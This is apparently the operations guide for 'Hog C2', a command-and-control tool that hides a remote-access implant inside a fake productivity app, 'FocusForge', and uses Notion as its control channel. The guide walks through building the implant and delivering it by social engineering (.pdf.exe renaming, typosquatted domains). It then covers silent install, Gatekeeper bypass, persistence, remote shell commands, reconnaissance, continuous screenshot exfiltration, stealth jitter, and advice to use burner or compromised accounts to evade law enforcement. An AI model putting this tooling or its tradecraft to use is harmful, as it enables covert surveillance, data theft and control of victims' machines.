# 🐗 Hog C2 - Setup & Operations Guide

**From concept to deployment in under 20 minutes**

This guide covers the technical implementation of Hog C2, from Notion integration setup through operational deployment and post-compromise management.

---

## Prerequisites

### Development Environment

| Requirement | Version | Purpose |
|-------------|---------|---------|
| Node.js | 18+ | Frontend build system, Tauri CLI |
| Rust | Latest stable | Backend compilation, implant core |
| Git | Any | Repository cloning |

### Platform-Specific Build Tools

**Windows:**
```powershell
# Install via Visual Studio Installer or standalone
# - Windows 10/11 SDK
# - Microsoft C++ Build Tools (MSVC)
```

**macOS:**
```bash
xcode-select --install
```

**Linux (Debian/Ubuntu):**
```bash
sudo apt install -y \
  libwebkit2gtk-4.1-dev \
  build-essential \
  curl \
  libssl-dev \
  libgtk-3-dev \
  libayatana-appindicator3-dev \
  librsvg2-dev
```

### Notion Account

- Free tier sufficient (1000 API requests/min)
- No credit card required
- Any workspace member can create integrations

---

## Phase 1: Notion Infrastructure Setup

### Step 1.1: Clone Pre-Configured Template

**Do not** manually create the database—use the pre-built template that includes all required schema, properties, and layouts.

👉 **[Duplicate Notion Template](https://osh-web.notion.site/Hog-C2-Template-2a315617d76a810bb95cea3b76c011ec?source=copy_link)**

This template contains:
- "All Clients" database with 13 pre-configured properties (Name, OS, Hostname, RAM, Disk, CPU, IP, Status, Last Seen, Screenshot, Persist, Terminal Command, Terminal Output)
- Gallery view with status cards and system metrics
- Client page template with terminal interface blocks
- Screenshot history section template
- Automated property formulas for uptime calculations

After duplication, the database will appear in your workspace as "Hog C2 Template". You can rename it or leave as-is (the name doesn't matter for API access—only the database ID matters).

### Step 1.2: Create Notion Integration

Integrations provide API authentication tokens that your implants will use to communicate with Notion.

1. Navigate to: https://www.notion.so/my-integrations
2. Click **"+ New integration"**
3. Configure:
   - **Name**: `Hog C2` (or any name for your reference)
   - **Logo**: Optional
   - **Associated workspace**: Select the workspace containing your cloned database
4. Click **"Submit"**

### Step 1.3: Configure Capabilities

Your integration needs these API permissions:

| Capability | Required | Reason |
|------------|----------|--------|
| **Read content** | ✅ | Fetch page properties (commands, config) |
| **Update content** | ✅ | Write command outputs, update system info |
| **Insert content** | ✅ | Create new client pages, append screenshots |
| **Read comments** | ❌ | Not used |
| **Insert comments** | ❌ | Not used |
| **Read user info** | ❌ | Not used |

These should be enabled by default for internal integrations.

### Step 1.4: Extract Integration Secret

On the integration settings page:

```
Internal Integration Secret
secret_████████████████████████████████████████
```

1. Click **"Show"** to reveal the full token
2. Click **"Copy"**
3. Store securely (this is the credential embedded in your implant)

**Format validation**: Must start with `secret_` and be 50 characters total.

### Step 1.5: Grant Database Access

Critical step—without this, API calls will return `403 Forbidden`.

1. Open your cloned "Hog C2 Template" database in Notion
2. Click the **"..."** menu (top-right of the database)
3. Hover over **"Connections"** or click **"Add connections"**
4. Find and select your integration (`Hog C2`)
5. Confirm access

Verify: You should now see your integration listed under "Connected to" at the top of the database.

---

## Phase 2: Build Configuration

### Step 2.1: Clone Repository

```bash
git clone https://github.com/YOUR_USERNAME/hog-c2.git
cd hog-c2
```

### Step 2.2: Install Dependencies

```bash
npm install
```

This installs:
- React, TypeScript, Vite (frontend)
- Tauri CLI (build tooling)
- Tailwind CSS, Recharts, Lucide icons (UI components)

Expected time: 2-5 minutes depending on connection speed.

### Step 2.3: Configure Environment Variables

Create your environment file:

```bash
cp .env.example .env
```

Edit `.env` with your credentials:

```ini
# Required: Notion API Secret from Step 1.4
NOTION_API_SECRET=secret_YOUR_ACTUAL_SECRET_HERE

# Required: Database name (must match exactly - case sensitive)
# If you renamed the template, update this
NOTION_DATABASE_NAME=All Clients

# Optional: Customize implant metadata
APP_NAME=FocusForge
APP_VERSION=1.0.0
```

**Critical configuration notes:**

1. **NOTION_API_SECRET**: Replace the placeholder with your real secret token. The format is `secret_` followed by 43 random characters.

2. **NOTION_DATABASE_NAME**: This must match your database title exactly (case-sensitive). If you renamed the template to "All Clients" or "My C2 Server", update this value accordingly.

3. **APP_NAME**: This is the display name for your implant. "FocusForge" provides a productivity app cover story. Choose something contextually appropriate for your engagement.

### Step 2.4: Validate Configuration (Optional)

Test Notion connectivity before building:

```bash
npm run tauri:dev
```

This launches the app in development mode. Check for errors in the console:

- ✅ Success: No `Failed to connect to Notion` errors, app window opens
- ❌ Failure: Check console for error messages (invalid token, database not found, etc.)

Press `Ctrl+C` to stop the dev server.

---

## Phase 3: Build Production Implant

### Step 3.1: Compile Release Build

**Windows:**
```powershell
npm run tauri build
```

**macOS/Linux:**
```bash
npm run tauri build
```

**Build process:**

1. **Frontend compilation** (Vite + TypeScript → optimized JavaScript)
   - Minification with Terser
   - Tree shaking to remove unused code
   - No source maps generated

2. **Backend compilation** (Rust → native binary)
   - Release profile with optimizations
   - Link-Time Optimization (LTO) enabled
   - Symbol stripping for size reduction
   - Environment variables baked into binary at compile time

3. **Bundling** (Platform-specific installer creation)
   - NSIS installer generation (Windows)
   - DMG/app bundle creation (macOS)
   - DEB/AppImage packaging (Linux)

**Expected build time:**
- First build: 10-20 minutes (Rust compiles all dependencies from scratch)
- Incremental builds: 2-5 minutes (cached dependencies)

**Performance impact**: CPU-intensive. Rust compilation will max out CPU cores.

### Step 3.2: Locate Build Artifacts

All installers are placed in:
```
src-tauri/target/release/bundle/
```

**Windows artifacts:**
```
bundle/
├── nsis/
│   └── FocusForge_1.0.0_x64-setup.exe  ← Primary installer (recommended)
└── msi/
    └── FocusForge_1.0.0_x64_en-US.msi  ← Alternative installer
```

**macOS artifacts:**
```
bundle/
├── dmg/
│   └── FocusForge_1.0.0_x64.dmg  ← Distributable disk image
└── macos/
    └── FocusForge.app  ← Application bundle
```

**Linux artifacts:**
```
bundle/
├── deb/
│   └── focusforge_1.0.0_amd64.deb  ← Debian/Ubuntu package
└── appimage/
    └── focusforge_1.0.0_amd64.AppImage  ← Universal Linux binary
```

### Step 3.3: Verify Binary Security

**Credential embedding verification**:

The Notion secret is embedded at compile time via Rust's `env!()` macro:

```rust
// In src-tauri/src/config/mod.rs
const NOTION_API_SECRET: &str = env!("NOTION_API_SECRET");
```

This means:
- ✅ No `.env` file needs to be distributed
- ✅ No registry keys or config files created at runtime
- ✅ Credentials encrypted within the binary blob
- ⚠️ Each build is unique to your Notion workspace—do not share publicly

**Verify no plaintext secrets**:
```bash
# Linux/macOS
strings src-tauri/target/release/bundle/nsis/FocusForge_1.0.0_x64-setup.exe | grep "secret_"

# Should return obfuscated output, not readable plaintext
```

---

## Phase 4: Deployment

### Target System Requirements

- **Windows**: 10 or 11 (x64)
- **macOS**: 10.15+ (Catalina or later)
- **Linux**: Any modern distro with GTK 3.x

### Deployment Methods

**1. Physical media:**
- USB drive, external HDD
- Useful for air-gapped or network-restricted environments

**2. Network transfer:**
- SMB share, FTP, HTTP download
- Requires network access from target

**3. Social engineering:**
- Email attachment (rename .exe to .pdf.exe, etc.)
- Cloud storage link (Google Drive, Dropbox)
- Typosquatted domain hosting the installer

**4. Post-exploitation:**
- Upload via existing C2 channel
- Drop to disk and execute via current implant

### Installation Process

**Windows:**
```powershell
# Run installer
.\FocusForge_1.0.0_x64-setup.exe

# Silent installation (no UI)
.\FocusForge_1.0.0_x64-setup.exe /S
```

The installer:
1. Extracts files to `C:\Program Files\FocusForge\`
2. Creates desktop shortcut
3. Adds registry key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\FocusForge`
4. Launches application in background
5. Registers to Notion database within 10 seconds

**macOS:**
1. Mount DMG: `open FocusForge_1.0.0_x64.dmg`
2. Drag `FocusForge.app` to `/Applications/`
3. First run: Right-click → Open (bypasses Gatekeeper)
4. Grant permissions when prompted:
   - **Accessibility**: Required for window tracking
   - **Screen Recording**: Required for screenshots

The app:
1. Copies to Applications
2. Creates LaunchAgent: `~/Library/LaunchAgents/com.focusforge.plist`
3. Registers to Notion within 10 seconds
4. Runs in menu bar (top-right)

**Linux (Debian/Ubuntu):**
```bash
# Install DEB package
sudo dpkg -i focusforge_1.0.0_amd64.deb
sudo apt-get install -f  # Resolve dependencies

# Or run AppImage directly
chmod +x focusforge_1.0.0_amd64.AppImage
./focusforge_1.0.0_amd64.AppImage
```

The app:
1. Installs to `/usr/bin/focusforge` (DEB) or runs in place (AppImage)
2. Creates autostart entry: `~/.config/autostart/focusforge.desktop`
3. Registers to Notion within 10 seconds
4. Runs in system tray

### Post-Installation Verification

**Check Notion database:**
1. Open your "Hog C2 Template" database
2. Within 10-30 seconds, a new entry should appear:
   - Name: `<IP_ADDRESS>` or `<HOSTNAME>`
   - Status: 🟢 Online
   - OS: Windows 11 (26200) / macOS 14.5 / Ubuntu 22.04
   - RAM, Disk, CPU: Populated with real-time data

**If no entry appears**:
- Check network connectivity (can target reach `api.notion.com`?)
- Verify integration has database access (Step 1.5)
- Check database name matches `.env` exactly
- Review application logs (see Troubleshooting section)

---

## Phase 5: C2 Operations

### Understanding the Interface

**Database (Gallery View):**
- Overview of all clients
- Status indicators (Online/Offline)
- Quick metrics (OS, RAM%, Disk%)
- Click any card to open full client page

**Client Page:**
- System information section (auto-updates every 5s)
- Live terminal interface
- Screenshot controls and history
- Persistence toggle

### Terminal Operations

The terminal interface uses Notion page properties as the communication channel.

**Execution flow:**

1. Operator updates "Terminal Command" property on client page
2. Within 5 seconds, agent detects property change via polling
3. Agent spawns shell process:
   - Windows: `cmd.exe /c <command>`
   - Linux/macOS: `bash -c <command>`
4. Agent captures stdout/stderr
5. Agent writes output to "Terminal Output" property
6. Agent clears "Terminal Command" property
7. Operator sees output in Notion

**Example commands:**

**Windows reconnaissance:**
```batch
# System information
systeminfo
wmic os get caption,version,osarchitecture

# Network enumeration
ipconfig /all
arp -a
netstat -ano

# User enumeration
whoami /all
net user
net localgroup administrators

# Process enumeration
tasklist /v
wmic process get name,processid,parentprocessid,executablepath

# File system
dir /s /b C:\Users\*\Desktop\*
dir /s /b C:\Users\*\Documents\*.docx
```

**Linux/macOS reconnaissance:**
```bash
# System information
uname -a
cat /etc/os-release
lscpu

# Network enumeration
ifconfig -a
ip addr show
netstat -tulpn

# User enumeration
id
cat /etc/passwd
sudo -l

# Process enumeration
ps auxww
lsof -i

# File system
find /home -type f -name "*.pdf" 2>/dev/null
find / -perm -4000 2>/dev/null  # SUID binaries
```

**Limitations:**

- Interactive commands (e.g., `ssh`, `ftp`) won't work—no TTY
- Long-running commands may timeout (default: 60 seconds)
- Large outputs (>10MB) may hit Notion API property size limits
- Commands requiring user input will hang

### Screenshot Exfiltration

**Enable capture:**
1. Open client page in Notion
2. Check the "Screenshot" property (checkbox)
3. Within 5-10 seconds, first screenshot captured
4. Image appears in "Screenshot History" section with timestamp

**Continuous monitoring:**
- Leave "Screenshot" checked for periodic capture
- Default interval: 30 seconds between captures
- Each screenshot uploaded as new Notion image block
- Historical trail maintained indefinitely (or until manually deleted)

**Disable capture:**
- Uncheck "Screenshot" property
- No new screenshots captured
- Existing screenshots remain in history

**Technical details:**

- **Windows**: Uses Windows Graphics Capture API (`Windows.Graphics.Capture`)
- **macOS**: Uses `screencapture` utility via NSTask
- **Linux**: Uses `scrot` or fallback to `gnome-screenshot`

- **Format**: PNG (lossless)
- **Resolution**: Full screen, native resolution
- **Size**: Typically 500KB - 2MB per screenshot (varies by screen resolution and content)
- **Upload**: Direct to Notion via multipart form-data to `POST /v1/blocks/{block_id}/children`

### Persistence Management

**Enable persistence:**
- Check "Persist" property on client page
- Agent adds itself to startup mechanisms:
  - Windows: Registry `Run` key or Task Scheduler
  - macOS: LaunchAgent plist
  - Linux: systemd service or autostart desktop entry

**Disable persistence:**
- Uncheck "Persist" property
- Agent removes startup entries
- App continues running but won't survive reboot

**Verify persistence:**

**Windows:**
```powershell
# Check registry
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v FocusForge

# Check Task Scheduler
schtasks /query /tn FocusForge
```

**macOS:**
```bash
# Check LaunchAgents
ls ~/Library/LaunchAgents/ | grep focusforge
launchctl list | grep focusforge
```

**Linux:**
```bash
# Check autostart
ls ~/.config/autostart/ | grep focusforge

# Check systemd
systemctl --user list-unit-files | grep focusforge
```

---

## Troubleshooting

### Issue: Client Not Registering

**Symptom**: Implant installed, but no entry in Notion database after 60+ seconds.

**Diagnostic steps:**

1. **Verify network connectivity:**
   ```bash
   curl -v https://api.notion.com/v1/users/me \
     -H "Authorization: Bearer secret_YOUR_TOKEN" \
     -H "Notion-Version: 2022-06-28"
   ```
   Expected: `200 OK` with JSON response. If timeout or connection refused, network is blocking Notion.

2. **Verify integration has database access:**
   - Open database in Notion
   - Check "Connected to" section shows your integration
   - If not, revisit Step 1.5

3. **Verify database name matches:**
   - Check database title in Notion (case-sensitive)
   - Check `NOTION_DATABASE_NAME` in `.env` used during build
   - Common mistake: "Hog C2 Template" vs "hog c2 template"

4. **Check application logs:**
   - **Windows**: `%APPDATA%\FocusForge\logs\app.log`
   - **macOS**: `~/Library/Application Support/FocusForge/logs/app.log`
   - **Linux**: `~/.config/FocusForge/logs/app.log`

   Look for errors like:
   - `Failed to authenticate with Notion API` → Invalid token
   - `Database not found` → Wrong database name or no access
   - `Network timeout` → Firewall blocking

### Issue: Terminal Commands Not Executing

**Symptom**: Commands entered in Notion, but no output appears.

**Diagnostic steps:**

1. **Check client status:**
   - Must be 🟢 Online
   - Check "Last Seen" timestamp—should update every 5-10 seconds
   - If offline or stale timestamp, client isn't polling

2. **Verify property names:**
   - Database must have exactly these property names:
     - "Terminal Command" (Text)
     - "Terminal Output" (Text)
   - Case-sensitive, spelling must match exactly

3. **Test with simple command:**
   - Windows: `echo test`
   - Linux/macOS: `pwd`
   - If this works, complex commands may be timing out

4. **Check command syntax:**
   - Ensure command is valid for target OS
   - Windows uses `cmd.exe` syntax (not PowerShell)
   - Linux/macOS uses `bash` syntax

### Issue: Screenshots Not Capturing

**Windows-specific:**
- Usually works out of the box
- If issues, run as Administrator once to initialize graphics capture

**macOS-specific:**
1. Grant Screen Recording permission:
   - System Preferences → Security & Privacy → Privacy tab
   - Scroll to "Screen Recording" in left sidebar
   - Check the box next to "FocusForge"
2. Restart the application after granting permission

**Linux-specific:**
1. Install screenshot utility:
   ```bash
   # Option 1: scrot
   sudo apt install scrot

   # Option 2: gnome-screenshot
   sudo apt install gnome-screenshot
   ```
2. Ensure X11 is running (Wayland may have issues—use XWayland compatibility)

### Issue: High API Rate Limit Errors

**Symptom**: Agent stops responding, Notion API returns `429 Too Many Requests`.

**Cause**: Exceeded Notion's 1000 requests/minute rate limit (unlikely with default 5s polling).

**Solutions:**

1. **Increase polling interval:**
   - Modify `src-tauri/src/config/mod.rs`
   - Change `POLL_INTERVAL_SECS` from 5 to 10 or 15
   - Rebuild implant

2. **Reduce concurrent clients:**
   - Each client polls independently
   - 100 clients × 12 requests/min = 1200 req/min (exceeds limit)
   - Solution: Stagger polling or increase intervals

3. **Implement exponential backoff:**
   - Code already includes retry logic with backoff
   - If hitting rate limits repeatedly, consider upgrading Notion plan (paid tiers have higher limits)

---

## Operational Security

### Credential Management

**Token security:**
- Tokens are embedded in binary, but can be extracted via reverse engineering
- Do NOT share built binaries publicly or in untrusted channels
- Create unique integrations per engagement
- Rotate tokens immediately after engagement completion

**Workspace isolation:**
- Use separate Notion workspaces for different clients/engagements
- Never mix client data in a single workspace
- Avoids cross-contamination and attribution issues

### Data Handling

**Screenshot storage:**
- All screenshots stored in your Notion workspace indefinitely
- Notion retains data even after deletion (for some time)
- For sensitive engagements, manually delete screenshots + client pages after completion
- Consider exporting data locally, then deleting from Notion

**Command history:**
- All terminal commands/outputs persist in Notion page history
- Notion's version history may retain sensitive commands even after editing
- Delete entire client page rather than just clearing properties

### Attribution Risks

**Even with LOTS technique, forensic analysis can reveal:**

1. **Notion API logs:**
   - Notion logs all API requests with timestamps, IP addresses, integration IDs
   - If Notion cooperates with LE, your integration can be traced to your account

2. **Binary artifacts:**
   - Notion integration token extractable from binary (advanced reverse engineering)
   - Code signatures, build artifacts may contain attribution (compiler version, build machine metadata)

3. **Network metadata:**
   - While traffic goes to trusted domain, patterns may be detectable:
     - Consistent 5-second polling from unusual source IPs
     - API calls from systems that normally don't use Notion
     - Geolocation mismatches (e.g., API calls from target country to your operator account in different country)

**OPSEC recommendations:**

- Use burner Notion account (temporary email, no personal info)
- Route Notion web access through VPN/proxy when operating C2
- Consider using compromised Notion accounts rather than your own
- Delete entire workspace after engagement, not just databases

---

## Advanced Techniques

### Multi-Client Coordination

**Database views for management:**

Create filtered views in Notion for operational efficiency:

1. **By Status:**
   - Filter: Status = "Online"
   - Use: Quick access to active implants

2. **By OS:**
   - Filter: OS contains "Windows"
   - Use: Target OS-specific commands

3. **By Geo/IP:**
   - Filter: IP Address contains "192.168.1"
   - Use: Identify internal network segments

**Bulk command execution:**

Notion doesn't natively support bulk property updates, but you can script it:

```python
from notion_client import Client

notion = Client(auth="secret_YOUR_TOKEN")
database_id = "YOUR_DATABASE_ID"

# Query all online Windows clients
results = notion.databases.query(
    database_id=database_id,
    filter={
        "and": [
            {"property": "Status", "select": {"equals": "Online"}},
            {"property": "OS", "rich_text": {"contains": "Windows"}}
        ]
    }
)

# Send command to all
for page in results["results"]:
    notion.pages.update(
        page_id=page["id"],
        properties={
            "Terminal Command": {"rich_text": [{"text": {"content": "whoami"}}]}
        }
    )
    print(f"Sent command to {page['properties']['Name']['title'][0]['plain_text']}")
```

### Stealth Enhancements

**Jitter configuration:**

Modify polling jitter to avoid pattern detection:

```rust
// In src-tauri/src/services/tracking.rs
const POLL_INTERVAL_SECS: u64 = 5;
const JITTER_MAX_SECS: u64 = 3;  // Randomize ±3 seconds

let jitter = rand::thread_rng().gen_range(0..=JITTER_MAX_SECS);
let sleep_duration = Duration::from_secs(POLL_INTERVAL_SECS + jitter);
```

**Rate limiting emulation:**

Mimic human API usage patterns:

```rust
// Add delays between API operations
after_read_page();
sleep(random(500ms, 2000ms));
before_update_page();
```

---

## Cleanup & Decommissioning

After completing your engagement, proper cleanup is critical:

### Remove Implants

**Windows:**
```powershell
# Uninstall via Control Panel or:
wmic product where name="FocusForge" call uninstall

# Manual cleanup
Remove-Item -Recurse "C:\Program Files\FocusForge\"
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v FocusForge /f
```

**macOS:**
```bash
launchctl unload ~/Library/LaunchAgents/com.focusforge.plist
rm ~/Library/LaunchAgents/com.focusforge.plist
rm -rf /Applications/FocusForge.app
rm -rf ~/Library/Application\ Support/FocusForge/
```

**Linux:**
```bash
sudo apt remove focusforge  # If installed via DEB
rm ~/.config/autostart/focusforge.desktop
rm -rf ~/.config/FocusForge/
```

### Revoke Notion Access

1. Go to https://www.notion.so/my-integrations
2. Find your integration ("Hog C2")
3. Click "..." menu → Delete integration
4. Confirm deletion

This immediately invalidates all tokens, severing all active implant connections.

### Delete Data

1. Delete "Hog C2 Template" database (moves to trash)
2. Permanently delete from trash
3. (Optional) Delete entire workspace if used exclusively for this engagement

**Note**: Notion may retain data in backups for some time. For maximum security, consider Notion's data retention policies and potential LE cooperation.

---

## References & Further Reading

- [Notion API Documentation](https://developers.notion.com/)
- [Tauri Documentation](https://tauri.app/)
- [JA3 TLS Fingerprinting](https://github.com/salesforce/ja3)
- [Australian Cyber Security Centre: LOTS Techniques](https://www.cyber.gov.au/)
- [Microsoft Purview DLP](https://learn.microsoft.com/en-us/purview/dlp-learn-about-dlp)

---

<div align="center">

**For authorized security testing only**

*Read the main [README.md](./README.md) for full technical analysis and research background*

</div>
